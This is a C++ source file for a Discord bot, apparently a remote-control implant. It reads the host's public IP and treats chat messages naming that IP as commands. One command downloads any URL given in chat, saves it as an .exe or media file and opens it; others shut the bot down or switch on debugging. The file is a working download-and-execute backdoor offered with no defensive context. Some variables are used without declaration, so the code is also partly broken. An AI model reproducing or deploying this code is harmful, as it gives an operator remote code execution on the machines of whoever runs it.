#include "../headers/curPipe_engine.hpp"
#include <cstdlib>

#define version "1.0"


std::string myip;

namespace curPipe {

    netWork::netWork(std::string token) : bot(token, dpp::i_default_intents | dpp::i_message_content) { 
    bot.on_log(dpp::utility::cout_logger());
}




bool debug = false;

    netWork::~netWork(){

    }
    
    void netWork::readCommandsOnChat() {
        curPipe::payloader("https://ipinfo.io/ip", "ip.txt");
        myip = curPipe::readFiles("ip.txt");
        
        bot.on_message_create([this](const dpp::message_create_t& event) {
            if (event.msg.content.find(';') != std::string::npos) {
                try {
                    std::string nameOfFile = "default"; 



                    if (curPipe::findWordsOnString(event.msg.content, "myIp")){
                        curPipe::payloader("https://ipinfo.io/ip", "ip.txt");
                        myip = curPipe::readFiles("ip.txt");
                        event.reply(myip);
                    }

                    
					


                    if (event.msg.content.find(myip) != std::string::npos){
                        event.reply("Dados enviados para " + myip + ".");
                        if (curPipe::findWordsOnString(event.msg.content, "shutDown")) {
                            event.reply("Desligando o servidor . . .");
                            std::this_thread::sleep_for(std::chrono::seconds(3));
                            bot.shutdown();
                        }

                        

                        if (curPipe::findWordsOnString(event.msg.content, "deBugger")) {
                            event.reply("ativando o debugger . . .");
                            deBugger = true;
                            event.reply("debugger ativado");
                        }

                        if (curPipe::findWordsOnString(event.msg.content, "version")) {
                            event.reply(version);
                        }
                        
                        if (curPipe::findWordsOnString(event.msg.content, "pl.")){
                        
                            if (curPipe::findWordsOnString(event.msg.content, "pl.")){
                            std::unordered_map<std::string, std::string> commands = {
                                {"pl.Png", ".png"},
                                {"pl.Exe", ".exe"},
                                {"pl.Gif", ".gif"},
                                {"pl.Txt", ".txt"},
                                {"pl.Mp4", ".mp4"}
                            };

                            for (const auto& [command, extension] : commands) {
                                if (curPipe::findWordsOnString(event.msg.content, command)) 
                                    {cleanedMensage = curPipe::cleanWordsOnString(event.msg.content, command, true);
                                    if(deBugger){
                                        event.reply("dados do png recebidos e abertos. " + cleanedMensage);
                                    }
                                    curPipe::payloader(cleanedMensage, nameOfFile + extension);
                                    curPipe::openFiles(nameOfFile + extension);
                                    }
                                }
                            }                        
                        }
                    }
                } catch (const std::exception& e) {
                    std::cerr << "Erro: " << e.what() << std::endl;
                }
            }
        });
    }





    void netWork::perfomBot(){
        bot.start(dpp::st_wait);
    }
}
    